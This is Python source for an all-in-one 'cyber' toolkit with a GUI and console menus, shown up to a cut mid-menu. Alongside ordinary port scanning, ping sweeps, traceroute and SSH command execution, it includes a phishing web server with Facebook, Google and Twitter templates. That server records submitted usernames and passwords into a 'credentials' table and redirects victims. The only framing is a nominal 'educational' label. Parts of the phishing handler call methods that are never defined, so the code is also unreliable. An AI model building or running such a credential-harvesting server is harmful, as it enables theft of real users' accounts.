"""
ACCURATE CYBER STAR - ULTIMATE EDITION v4.0
Author: Ian Carter Kulani
Version: Ultimate v4.0 - Console + GUI + Advanced Features
"""

import os
import sys
import socket
import threading
import time
import requests
import json
import subprocess
import platform
import psutil
import ipaddress
import sqlite3
import re
import shutil
import urllib.parse
import webbrowser
import logging
import random
import string
import hashlib
import base64
import zipfile
import tempfile
import argparse
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Set, Tuple, Optional, Any
from collections import deque, defaultdict

# Advanced imports with fallbacks
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, RSAKey, SSHException
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False
    print("⚠️ SSH features disabled (install: pip install paramiko)")

try:
    import scapy.all as scapy
    from scapy.all import IP, ICMP, TCP, UDP, ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("⚠️ Traffic generation disabled (install: pip install scapy)")

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False
    print("⚠️ Advanced scans disabled (install: pip install python-nmap)")

# GUI imports
GUI_AVAILABLE = False
try:
    from PyQt5.QtWidgets import *
    from PyQt5.QtCore import *
    from PyQt5.QtGui import *
    GUI_AVAILABLE = True
except ImportError:
    print("⚠️ GUI features disabled (install: pip install pyqt5)")

# Web server imports
try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    from socketserver import ThreadingMixIn
    WEBSERVER_AVAILABLE = True
except ImportError:
    WEBSERVER_AVAILABLE = False

# Configuration
CONFIG_FILE = "cyber_security_config.json"
DATABASE_FILE = "network_data.db"
REPORT_DIR = "reports"
TEMPLATE_DIR = "templates"
LOG_FILE = "cyberstar.log"

# ANSI Colors for Console
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# ==================== CORE MODULES ====================

class DatabaseManager:
    """Unified database management"""
    
    def __init__(self):
        self.db_file = DATABASE_FILE
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # Command history
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                success BOOLEAN DEFAULT 1
            )
        ''')
        
        # Network scans
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                results TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Captured credentials
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                password TEXT,
                source TEXT,
                ip_address TEXT,
                user_agent TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # SSH sessions
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ssh_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                host TEXT,
                port INTEGER,
                username TEXT,
                key_path TEXT,
                last_used TIMESTAMP
            )
        ''')
        
        # System events
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS system_events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                event_type TEXT,
                description TEXT,
                severity TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def log_event(self, event_type: str, description: str, severity: str = "INFO"):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO system_events (event_type, description, severity) VALUES (?, ?, ?)',
            (event_type, description, severity)
        )
        conn.commit()
        conn.close()

class NetworkScanner:
    """Enhanced network scanner"""
    
    def __init__(self):
        self.db = DatabaseManager()
        
    def ping_sweep(self, network: str) -> List[str]:
        """Ping sweep a network"""
        alive_hosts = []
        try:
            net = ipaddress.ip_network(network, strict=False)
            for ip in net.hosts():
                ip_str = str(ip)
                if self.ping(ip_str):
                    alive_hosts.append(ip_str)
        except Exception as e:
            print(f"❌ Ping sweep error: {e}")
        return alive_hosts
    
    def ping(self, ip: str, count: int = 4) -> bool:
        """Ping a single IP"""
        try:
            param = '-n' if platform.system().lower() == 'windows' else '-c'
            cmd = ['ping', param, str(count), ip]
            result = subprocess.run(cmd, capture_output=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def port_scan(self, ip: str, ports: str = "1-1024") -> Dict:
        """Port scan using available methods"""
        if NMAP_AVAILABLE:
            return self.nmap_scan(ip, ports)
        else:
            return self.basic_port_scan(ip, ports)
    
    def nmap_scan(self, ip: str, ports: str) -> Dict:
        """Advanced nmap scan"""
        try:
            nm = nmap.PortScanner()
            nm.scan(ip, ports, arguments='-T4')
            
            if ip in nm.all_hosts():
                open_ports = []
                for proto in nm[ip].all_protocols():
                    for port in nm[ip][proto].keys():
                        if nm[ip][proto][port]['state'] == 'open':
                            service = nm[ip][proto][port].get('name', 'unknown')
                            open_ports.append(f"{port}/{proto} ({service})")
                
                return {
                    'success': True,
                    'ip': ip,
                    'open_ports': open_ports,
                    'hostname': nm[ip].hostname(),
                    'status': nm[ip].state()
                }
        except Exception as e:
            return {'success': False, 'error': str(e)}
        
        return {'success': False, 'error': 'Host not found'}
    
    def basic_port_scan(self, ip: str, ports: str) -> Dict:
        """Basic Python port scan"""
        open_ports = []
        try:
            start_port, end_port = map(int, ports.split('-'))
            for port in range(start_port, min(end_port, 1000) + 1):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    open_ports.append(str(port))
        except Exception as e:
            return {'success': False, 'error': str(e)}
        
        return {
            'success': True,
            'ip': ip,
            'open_ports': open_ports,
            'hostname': 'Unknown',
            'status': 'Scanned'
        }
    
    def get_ip_info(self, ip: str) -> Dict:
        """Get IP geolocation and info"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'success':
                    return {
                        'country': data.get('country'),
                        'region': data.get('regionName'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'org': data.get('org'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
        except:
            pass
        return {}

class TracerouteTool:
    """Advanced traceroute tool"""
    
    @staticmethod
    def traceroute(target: str) -> str:
        system = platform.system()
        try:
            if system == 'Windows':
                cmd = ['tracert', '-d', target]
            elif shutil.which('traceroute'):
                cmd = ['traceroute', '-n', target]
            elif shutil.which('tracepath'):
                cmd = ['tracepath', target]
            else:
                cmd = ['ping', '-c', '4', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result.stdout
        except Exception as e:
            return f"Traceroute error: {str(e)}"

class SSHManager:
    """SSH connection manager"""
    
    def __init__(self):
        self.connections = {}
        self.db = DatabaseManager()
    
    def connect(self, host: str, port: int, username: str, password: str = None, key_path: str = None) -> Tuple[bool, str]:
        if not SSH_AVAILABLE:
            return False, "SSH not available"
        
        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            
            if key_path and os.path.exists(key_path):
                key = RSAKey.from_private_key_file(key_path)
                client.connect(host, port, username, pkey=key)
            elif password:
                client.connect(host, port, username, password)
            else:
                return False, "No authentication method provided"
            
            conn_id = f"{username}@{host}:{port}"
            self.connections[conn_id] = client
            return True, f"✅ Connected to {conn_id}"
        except Exception as e:
            return False, f"❌ SSH error: {str(e)}"
    
    def execute(self, conn_id: str, command: str) -> Tuple[bool, str]:
        if conn_id not in self.connections:
            return False, "Connection not found"
        
        try:
            stdin, stdout, stderr = self.connections[conn_id].exec_command(command)
            output = stdout.read().decode()
            error = stderr.read().decode()
            
            if error:
                return False, error
            return True, output
        except Exception as e:
            return False, str(e)

class PhishingServer:
    """Phishing server for educational purposes"""
    
    def __init__(self, port: int = 8080, template: str = "default", redirect_url: str = "https://example.com"):
        self.port = port
        self.template = template
        self.redirect_url = redirect_url
        self.running = False
        self.server = None
        self.thread = None
        self.captured_credentials = []
    
    def start(self):
        """Start phishing server"""
        if WEBSERVER_AVAILABLE:
            self.thread = threading.Thread(target=self._run_server, daemon=True)
            self.thread.start()
            return True, f"Server started on port {self.port}"
        return False, "Web server module not available"
    
    def _run_server(self):
        """Internal server runner"""
        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                html = self.get_template()
                self.wfile.write(html.encode())
            
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                self.log_credentials(post_data)
                
                self.send_response(302)
                self.send_header('Location', self.redirect_url)
                self.end_headers()
            
            def log_message(self, format, *args):
                pass
        
        try:
            self.server = HTTPServer(('0.0.0.0', self.port), Handler)
            self.running = True
            self.server.serve_forever()
        except Exception as e:
            print(f"Server error: {e}")

# ==================== GUI APPLICATION ====================

if GUI_AVAILABLE:
    class CyberStarGUI(QMainWindow):
        """Main GUI Application"""
        
        def __init__(self):
            super().__init__()
            self.setWindowTitle("Accurate Cyber Star - Ultimate Edition")
            self.setGeometry(100, 100, 1200, 800)
            
            # Initialize managers
            self.db = DatabaseManager()
            self.scanner = NetworkScanner()
            self.ssh_manager = SSHManager()
            self.phishing_server = None
            
            # UI Setup
            self.init_ui()
            
            # Load config
            self.load_config()
        
        def init_ui(self):
            """Initialize user interface"""
            # Create menu bar
            menubar = self.menuBar()
            
            # File menu
            file_menu = menubar.addMenu('File')
            export_action = QAction('Export Data', self)
            export_action.triggered.connect(self.export_data)
            file_menu.addAction(export_action)
            exit_action = QAction('Exit', self)
            exit_action.triggered.connect(self.close)
            file_menu.addAction(exit_action)
            
            # Tools menu
            tools_menu = menubar.addMenu('Tools')
            network_tools = QAction('Network Tools', self)
            network_tools.triggered.connect(self.show_network_tools)
            tools_menu.addAction(network_tools)
            
            # Main widget
            central_widget = QWidget()
            self.setCentralWidget(central_widget)
            layout = QVBoxLayout(central_widget)
            
            # Tab widget
            self.tabs = QTabWidget()
            layout.addWidget(self.tabs)
            
            # Dashboard tab
            self.create_dashboard_tab()
            
            # Network scanner tab
            self.create_scanner_tab()
            
            # SSH manager tab
            self.create_ssh_tab()
            
            # Phishing tools tab
            self.create_phishing_tab()
            
            # Log viewer tab
            self.create_log_tab()
            
            # Status bar
            self.status_bar = QStatusBar()
            self.setStatusBar(self.status_bar)
            self.status_bar.showMessage("Ready")
        
        def create_dashboard_tab(self):
            """Create dashboard tab"""
            tab = QWidget()
            layout = QVBoxLayout(tab)
            
            # System info
            sys_group = QGroupBox("System Information")
            sys_layout = QFormLayout()
            
            self.sys_info = QTextEdit()
            self.sys_info.setReadOnly(True)
            sys_layout.addRow(self.sys_info)
            
            refresh_btn = QPushButton("Refresh System Info")
            refresh_btn.clicked.connect(self.update_system_info)
            sys_layout.addRow(refresh_btn)
            
            sys_group.setLayout(sys_layout)
            layout.addWidget(sys_group)
            
            # Quick actions
            actions_group = QGroupBox("Quick Actions")
            actions_layout = QHBoxLayout()
            
            ping_btn = QPushButton("Quick Ping")
            ping_btn.clicked.connect(self.quick_ping)
            actions_layout.addWidget(ping_btn)
            
            scan_btn = QPushButton("Network Scan")
            scan_btn.clicked.connect(self.quick_scan)
            actions_layout.addWidget(scan_btn)
            
            trace_btn = QPushButton("Traceroute")
            trace_btn.clicked.connect(self.quick_trace)
            actions_layout.addWidget(trace_btn)
            
            actions_group.setLayout(actions_layout)
            layout.addWidget(actions_group)
            
            self.tabs.addTab(tab, "📊 Dashboard")
            
            # Initial update
            self.update_system_info()
        
        def create_scanner_tab(self):
            """Create network scanner tab"""
            tab = QWidget()
            layout = QVBoxLayout(tab)
            
            # Input section
            input_group = QGroupBox("Scan Configuration")
            input_layout = QFormLayout()
            
            self.scan_target = QLineEdit()
            self.scan_target.setPlaceholderText("Enter IP address or network")
            input_layout.addRow("Target:", self.scan_target)
            
            self.scan_type = QComboBox()
            self.scan_type.addItems(["Ping Sweep", "Port Scan", "Service Detection"])
            input_layout.addRow("Scan Type:", self.scan_type)
            
            scan_btn = QPushButton("Start Scan")
            scan_btn.clicked.connect(self.start_scan)
            input_layout.addRow(scan_btn)
            
            input_group.setLayout(input_layout)
            layout.addWidget(input_group)
            
            # Results section
            results_group = QGroupBox("Scan Results")
            results_layout = QVBoxLayout()
            
            self.scan_results = QTextEdit()
            self.scan_results.setReadOnly(True)
            results_layout.addWidget(self.scan_results)
            
            results_group.setLayout(results_layout)
            layout.addWidget(results_group)
            
            self.tabs.addTab(tab, "🔍 Scanner")
        
        def create_ssh_tab(self):
            """Create SSH manager tab"""
            tab = QWidget()
            layout = QVBoxLayout(tab)
            
            # Connection form
            conn_group = QGroupBox("SSH Connection")
            conn_layout = QFormLayout()
            
            self.ssh_host = QLineEdit()
            self.ssh_host.setPlaceholderText("Hostname or IP")
            conn_layout.addRow("Host:", self.ssh_host)
            
            self.ssh_port = QSpinBox()
            self.ssh_port.setRange(1, 65535)
            self.ssh_port.setValue(22)
            conn_layout.addRow("Port:", self.ssh_port)
            
            self.ssh_user = QLineEdit()
            self.ssh_user.setPlaceholderText("Username")
            conn_layout.addRow("Username:", self.ssh_user)
            
            self.ssh_pass = QLineEdit()
            self.ssh_pass.setEchoMode(QLineEdit.Password)
            self.ssh_pass.setPlaceholderText("Password")
            conn_layout.addRow("Password:", self.ssh_pass)
            
            self.ssh_key = QLineEdit()
            self.ssh_key.setPlaceholderText("SSH key path (optional)")
            conn_layout.addRow("Key File:", self.ssh_key)
            
            # Buttons
            btn_layout = QHBoxLayout()
            connect_btn = QPushButton("Connect")
            connect_btn.clicked.connect(self.ssh_connect)
            btn_layout.addWidget(connect_btn)
            
            disconnect_btn = QPushButton("Disconnect")
            disconnect_btn.clicked.connect(self.ssh_disconnect)
            btn_layout.addWidget(disconnect_btn)
            
            conn_layout.addRow(btn_layout)
            conn_group.setLayout(conn_layout)
            layout.addWidget(conn_group)
            
            # Command execution
            cmd_group = QGroupBox("Command Execution")
            cmd_layout = QVBoxLayout()
            
            self.ssh_command = QLineEdit()
            self.ssh_command.setPlaceholderText("Enter command to execute")
            cmd_layout.addWidget(self.ssh_command)
            
            execute_btn = QPushButton("Execute")
            execute_btn.clicked.connect(self.ssh_execute)
            cmd_layout.addWidget(execute_btn)
            
            self.ssh_output = QTextEdit()
            self.ssh_output.setReadOnly(True)
            cmd_layout.addWidget(self.ssh_output)
            
            cmd_group.setLayout(cmd_layout)
            layout.addWidget(cmd_group)
            
            self.tabs.addTab(tab, "🔐 SSH")
        
        def create_phishing_tab(self):
            """Create phishing tools tab"""
            tab = QWidget()
            layout = QVBoxLayout(tab)
            
            # Server configuration
            server_group = QGroupBox("Phishing Server Configuration")
            server_layout = QFormLayout()
            
            self.phish_port = QSpinBox()
            self.phish_port.setRange(1024, 65535)
            self.phish_port.setValue(8080)
            server_layout.addRow("Port:", self.phish_port)
            
            self.phish_template = QComboBox()
            self.phish_template.addItems(["Facebook", "Google", "Twitter", "Custom"])
            server_layout.addRow("Template:", self.phish_template)
            
            self.phish_redirect = QLineEdit()
            self.phish_redirect.setText("https://example.com")
            server_layout.addRow("Redirect URL:", self.phish_redirect)
            
            # Buttons
            btn_layout = QHBoxLayout()
            self.start_phish_btn = QPushButton("Start Server")
            self.start_phish_btn.clicked.connect(self.toggle_phishing_server)
            btn_layout.addWidget(self.start_phish_btn)
            
            view_logs_btn = QPushButton("View Logs")
            view_logs_btn.clicked.connect(self.view_phishing_logs)
            btn_layout.addWidget(view_logs_btn)
            
            server_layout.addRow(btn_layout)
            server_group.setLayout(server_layout)
            layout.addWidget(server_group)
            
            # Captured data
            data_group = QGroupBox("Captured Data")
            data_layout = QVBoxLayout()
            
            self.phish_data = QTextEdit()
            self.phish_data.setReadOnly(True)
            data_layout.addWidget(self.phish_data)
            
            clear_btn = QPushButton("Clear Data")
            clear_btn.clicked.connect(self.clear_phishing_data)
            data_layout.addWidget(clear_btn)
            
            data_group.setLayout(data_layout)
            layout.addWidget(data_group)
            
            self.tabs.addTab(tab, "🎣 Phishing Tools")
        
        def create_log_tab(self):
            """Create log viewer tab"""
            tab = QWidget()
            layout = QVBoxLayout(tab)
            
            # Log controls
            ctrl_group = QGroupBox("Log Controls")
            ctrl_layout = QHBoxLayout()
            
            refresh_btn = QPushButton("Refresh Logs")
            refresh_btn.clicked.connect(self.refresh_logs)
            ctrl_layout.addWidget(refresh_btn)
            
            clear_btn = QPushButton("Clear Logs")
            clear_btn.clicked.connect(self.clear_logs)
            ctrl_layout.addWidget(clear_btn)
            
            export_btn = QPushButton("Export Logs")
            export_btn.clicked.connect(self.export_logs)
            ctrl_layout.addWidget(export_btn)
            
            ctrl_group.setLayout(ctrl_layout)
            layout.addWidget(ctrl_group)
            
            # Log display
            self.log_display = QTextEdit()
            self.log_display.setReadOnly(True)
            layout.addWidget(self.log_display)
            
            self.tabs.addTab(tab, "📋 Logs")
            
            # Initial log load
            self.refresh_logs()
        
        # ===== GUI Methods =====
        
        def update_system_info(self):
            """Update system information display"""
            info = "💻 System Information\n\n"
            info += f"OS: {platform.system()} {platform.release()}\n"
            info += f"CPU Cores: {psutil.cpu_count()}\n"
            info += f"CPU Usage: {psutil.cpu_percent()}%\n"
            
            mem = psutil.virtual_memory()
            info += f"Memory: {mem.percent}% used\n"
            
            disk = psutil.disk_usage('/')
            info += f"Disk: {disk.percent}% used\n"
            
            try:
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                info += f"Hostname: {hostname}\n"
                info += f"Local IP: {local_ip}\n"
            except:
                info += "Network: Unable to determine\n"
            
            self.sys_info.setText(info)
        
        def quick_ping(self):
            """Quick ping tool"""
            target, ok = QInputDialog.getText(self, "Ping Target", "Enter IP or hostname:")
            if ok and target:
                threading.Thread(target=self._do_ping, args=(target,), daemon=True).start()
        
        def _do_ping(self, target):
            """Perform ping in background"""
            success = self.scanner.ping(target)
            QMetaObject.invokeMethod(self, "_ping_result", 
                                   Qt.QueuedConnection,
                                   Q_ARG(bool, success),
                                   Q_ARG(str, target))
        
        def _ping_result(self, success, target):
            """Handle ping result"""
            if success:
                QMessageBox.information(self, "Ping Result", f"✅ {target} is reachable")
            else:
                QMessageBox.warning(self, "Ping Result", f"❌ {target} is unreachable")
        
        def start_scan(self):
            """Start network scan"""
            target = self.scan_target.text().strip()
            if not target:
                QMessageBox.warning(self, "Error", "Please enter a target")
                return
            
            scan_type = self.scan_type.currentText()
            threading.Thread(target=self._run_scan, args=(target, scan_type), daemon=True).start()
        
        def _run_scan(self, target, scan_type):
            """Run scan in background"""
            if scan_type == "Ping Sweep":
                hosts = self.scanner.ping_sweep(target)
                result = f"Ping Sweep Results for {target}:\n"
                result += f"Active hosts: {len(hosts)}\n"
                for host in hosts:
                    result += f"  • {host}\n"
            else:
                scan_result = self.scanner.port_scan(target)
                result = f"Port Scan Results for {target}:\n"
                if scan_result['success']:
                    ports = scan_result.get('open_ports', [])
                    result += f"Open ports: {len(ports)}\n"
                    for port in ports[:20]:  # Limit display
                        result += f"  • {port}\n"
                    if len(ports) > 20:
                        result += f"  ... and {len(ports)-20} more\n"
                else:
                    result = f"Scan failed: {scan_result.get('error', 'Unknown error')}"
            
            QMetaObject.invokeMethod(self, "_scan_result",
                                   Qt.QueuedConnection,
                                   Q_ARG(str, result))
        
        def _scan_result(self, result):
            """Display scan results"""
            self.scan_results.setText(result)
        
        def ssh_connect(self):
            """Connect via SSH"""
            host = self.ssh_host.text().strip()
            port = self.ssh_port.value()
            username = self.ssh_user.text().strip()
            password = self.ssh_pass.text()
            key_path = self.ssh_key.text().strip()
            
            if not all([host, username]):
                QMessageBox.warning(self, "Error", "Please fill required fields")
                return
            
            success, message = self.ssh_manager.connect(host, port, username, password, key_path)
            if success:
                QMessageBox.information(self, "SSH", message)
                self.status_bar.showMessage(f"SSH: Connected to {host}")
            else:
                QMessageBox.critical(self, "SSH Error", message)
        
        def ssh_execute(self):
            """Execute SSH command"""
            command = self.ssh_command.text().strip()
            if not command:
                QMessageBox.warning(self, "Error", "Please enter a command")
                return
            
            # For simplicity, use first connection
            if not self.ssh_manager.connections:
                QMessageBox.warning(self, "Error", "No SSH connections")
                return
            
            conn_id = list(self.ssh_manager.connections.keys())[0]
            success, output = self.ssh_manager.execute(conn_id, command)
            
            if success:
                self.ssh_output.setText(output)
            else:
                QMessageBox.warning(self, "SSH Error", output)
        
        def toggle_phishing_server(self):
            """Start/stop phishing server"""
            if self.phishing_server and self.phishing_server.running:
                # Stop server
                self.phishing_server.running = False
                self.start_phish_btn.setText("Start Server")
                QMessageBox.information(self, "Server", "Phishing server stopped")
            else:
                # Start server
                port = self.phish_port.value()
                template = self.phish_template.currentText()
                redirect = self.phish_redirect.text()
                
                self.phishing_server = PhishingServer(port, template, redirect)
                success, message = self.phishing_server.start()
                
                if success:
                    self.start_phish_btn.setText("Stop Server")
                    QMessageBox.information(self, "Server", f"Server started on port {port}")
                else:
                    QMessageBox.critical(self, "Server Error", message)
        
        def show_network_tools(self):
            """Show network tools dialog"""
            dialog = NetworkToolsDialog(self)
            dialog.exec_()
        
        def refresh_logs(self):
            """Refresh log display"""
            try:
                with open(LOG_FILE, 'r') as f:
                    logs = f.read()[-10000:]  # Last 10k chars
                self.log_display.setText(logs)
            except FileNotFoundError:
                self.log_display.setText("No logs found")
        
        def load_config(self):
            """Load configuration"""
            pass
        
        def export_data(self):
            """Export data"""
            pass
        
        def quick_scan(self):
            """Quick network scan"""
            target, ok = QInputDialog.getText(self, "Network Scan", "Enter IP or network:")
            if ok and target:
                self.scan_target.setText(target)
                self.start_scan()
        
        def quick_trace(self):
            """Quick traceroute"""
            target, ok = QInputDialog.getText(self, "Traceroute", "Enter target:")
            if ok and target:
                threading.Thread(target=self._do_trace, args=(target,), daemon=True).start()
        
        def _do_trace(self, target):
            """Perform traceroute"""
            result = TracerouteTool.traceroute(target)
            QMetaObject.invokeMethod(self, "_trace_result",
                                   Qt.QueuedConnection,
                                   Q_ARG(str, result))
        
        def _trace_result(self, result):
            """Display traceroute result"""
            QMessageBox.information(self, "Traceroute Result", result)
        
        def view_phishing_logs(self):
            """View phishing logs"""
            if hasattr(self.phishing_server, 'captured_credentials'):
                data = "\n".join([str(cred) for cred in self.phishing_server.captured_credentials])
                self.phish_data.setText(data or "No credentials captured")
        
        def clear_phishing_data(self):
            """Clear phishing data"""
            if hasattr(self.phishing_server, 'captured_credentials'):
                self.phishing_server.captured_credentials.clear()
                self.phish_data.clear()
        
        def clear_logs(self):
            """Clear logs"""
            try:
                with open(LOG_FILE, 'w') as f:
                    f.write("")
                self.refresh_logs()
            except:
                pass
        
        def export_logs(self):
            """Export logs to file"""
            filename, _ = QFileDialog.getSaveFileName(self, "Export Logs", "", "Text Files (*.txt);;All Files (*)")
            if filename:
                try:
                    with open(LOG_FILE, 'r') as src, open(filename, 'w') as dst:
                        dst.write(src.read())
                    QMessageBox.information(self, "Export", "Logs exported successfully")
                except Exception as e:
                    QMessageBox.critical(self, "Export Error", str(e))
        
        def ssh_disconnect(self):
            """Disconnect SSH"""
            if self.ssh_manager.connections:
                for conn_id in list(self.ssh_manager.connections.keys()):
                    self.ssh_manager.connections[conn_id].close()
                self.ssh_manager.connections.clear()
                QMessageBox.information(self, "SSH", "All connections closed")
                self.status_bar.showMessage("SSH: Disconnected")

# ==================== NETWORK TOOLS DIALOG ====================

if GUI_AVAILABLE:
    class NetworkToolsDialog(QDialog):
        """Network tools dialog"""
        
        def __init__(self, parent=None):
            super().__init__(parent)
            self.setWindowTitle("Network Security Tools")
            self.resize(800, 600)
            
            self.scanner = NetworkScanner()
            self.init_ui()
        
        def init_ui(self):
            layout = QVBoxLayout()
            self.setLayout(layout)
            
            # Tab widget
            tabs = QTabWidget()
            layout.addWidget(tabs)
            
            # Ping tool
            ping_tab = QWidget()
            ping_layout = QVBoxLayout(ping_tab)
            
            ping_group = QGroupBox("Ping Tool")
            ping_form = QFormLayout()
            
            self.ping_input = QLineEdit()
            self.ping_input.setPlaceholderText("Enter IP address or hostname")
            ping_form.addRow("Target:", self.ping_input)
            
            ping_btn = QPushButton("Ping")
            ping_btn.clicked.connect(self.do_ping)
            ping_form.addRow(ping_btn)
            
            self.ping_output = QTextEdit()
            self.ping_output.setReadOnly(True)
            ping_form.addRow("Output:", self.ping_output)
            
            ping_group.setLayout(ping_form)
            ping_layout.addWidget(ping_group)
            tabs.addTab(ping_tab, "Ping")
            
            # Port scanner
            scan_tab = QWidget()
            scan_layout = QVBoxLayout(scan_tab)
            
            scan_group = QGroupBox("Port Scanner")
            scan_form = QFormLayout()
            
            self.scan_input = QLineEdit()
            self.scan_input.setPlaceholderText("Enter IP address")
            scan_form.addRow("Target:", self.scan_input)
            
            self.port_range = QLineEdit()
            self.port_range.setText("1-1024")
            scan_form.addRow("Ports:", self.port_range)
            
            scan_btn = QPushButton("Scan Ports")
            scan_btn.clicked.connect(self.do_scan)
            scan_form.addRow(scan_btn)
            
            self.scan_output = QTextEdit()
            self.scan_output.setReadOnly(True)
            scan_form.addRow("Results:", self.scan_output)
            
            scan_group.setLayout(scan_form)
            scan_layout.addWidget(scan_group)
            tabs.addTab(scan_tab, "Port Scan")
            
            # IP Info
            info_tab = QWidget()
            info_layout = QVBoxLayout(info_tab)
            
            info_group = QGroupBox("IP Information")
            info_form = QFormLayout()
            
            self.info_input = QLineEdit()
            self.info_input.setPlaceholderText("Enter IP address")
            info_form.addRow("IP:", self.info_input)
            
            info_btn = QPushButton("Get Info")
            info_btn.clicked.connect(self.get_ip_info)
            info_form.addRow(info_btn)
            
            self.info_output = QTextEdit()
            self.info_output.setReadOnly(True)
            info_form.addRow("Information:", self.info_output)
            
            info_group.setLayout(info_form)
            info_layout.addWidget(info_group)
            tabs.addTab(info_tab, "IP Info")
            
            # Close button
            close_btn = QPushButton("Close")
            close_btn.clicked.connect(self.accept)
            layout.addWidget(close_btn)
        
        def do_ping(self):
            """Perform ping"""
            target = self.ping_input.text().strip()
            if not target:
                QMessageBox.warning(self, "Error", "Please enter a target")
                return
            
            def ping_thread():
                success = self.scanner.ping(target)
                result = f"Ping to {target}: {'✅ SUCCESS' if success else '❌ FAILED'}"
                QMetaObject.invokeMethod(self, "_ping_done",
                                       Qt.QueuedConnection,
                                       Q_ARG(str, result))
            
            threading.Thread(target=ping_thread, daemon=True).start()
        
        def _ping_done(self, result):
            """Handle ping completion"""
            self.ping_output.append(result)
        
        def do_scan(self):
            """Perform port scan"""
            target = self.scan_input.text().strip()
            ports = self.port_range.text().strip()
            
            if not target:
                QMessageBox.warning(self, "Error", "Please enter a target")
                return
            
            def scan_thread():
                result = self.scanner.port_scan(target, ports)
                output = f"Scanning {target} ports {ports}...\n"
                
                if result['success']:
                    open_ports = result.get('open_ports', [])
                    output += f"Found {len(open_ports)} open ports:\n"
                    for port in open_ports:
                        output += f"  • {port}\n"
                else:
                    output += f"Error: {result.get('error', 'Unknown')}"
                
                QMetaObject.invokeMethod(self, "_scan_done",
                                       Qt.QueuedConnection,
                                       Q_ARG(str, output))
            
            threading.Thread(target=scan_thread, daemon=True).start()
        
        def _scan_done(self, result):
            """Handle scan completion"""
            self.scan_output.setText(result)
        
        def get_ip_info(self):
            """Get IP information"""
            ip = self.info_input.text().strip()
            if not ip:
                QMessageBox.warning(self, "Error", "Please enter an IP address")
                return
            
            def info_thread():
                info = self.scanner.get_ip_info(ip)
                output = f"Information for {ip}:\n\n"
                
                if info:
                    for key, value in info.items():
                        if value:
                            output += f"{key}: {value}\n"
                else:
                    output = "Could not retrieve information"
                
                QMetaObject.invokeMethod(self, "_info_done",
                                       Qt.QueuedConnection,
                                       Q_ARG(str, output))
            
            threading.Thread(target=info_thread, daemon=True).start()
        
        def _info_done(self, result):
            """Handle info retrieval"""
            self.info_output.setText(result)

# ==================== CONSOLE INTERFACE ====================

class CyberStarConsole:
    """Console interface for Cyber Star"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.scanner = NetworkScanner()
        self.ssh_manager = SSHManager()
        self.phishing_server = None
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(LOG_FILE),
                logging.StreamHandler()
            ]
        )
    
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║          🛡️  ACCURATE CYBER STAR - ULTIMATE v4.0 🛡️          ║
    ║                                                              ║
    ║      Console + GUI + SSH + Scanning + Phishing + Tools       ║
    ║                                                              ║
    ║        Author: Ian Carter Kulani | For Educational Use       ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
{Colors.END}

"""
        print(banner)
    
    def print_menu(self):
        """Print main menu"""
        menu = f"""
{Colors.YELLOW}📋 MAIN MENU{Colors.END}

{Colors.GREEN}[1]{Colors.END} Network Scanner
{Colors.GREEN}[2]{Colors.END} SSH Manager
{Colors.GREEN}[3]{Colors.END} Phishing Tools
{Colors.GREEN}[4]{Colors.END} System Information
{Colors.GREEN}[5]{Colors.END} Database Tools
